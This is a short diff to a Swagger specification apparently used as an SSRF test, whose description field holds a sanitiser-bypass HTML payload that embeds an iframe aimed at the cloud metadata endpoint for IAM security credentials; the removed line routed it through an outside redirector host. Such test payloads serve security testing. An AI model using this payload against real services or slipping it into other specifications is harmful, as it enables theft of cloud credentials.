@@ -2,4 +2,4 @@ swagger: '2.0'
 info:
   title: ssrf Iframe test
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe src=//ssrf.localdomain.pw/custom-30x/?code=301&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/></iframe>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>"></form>
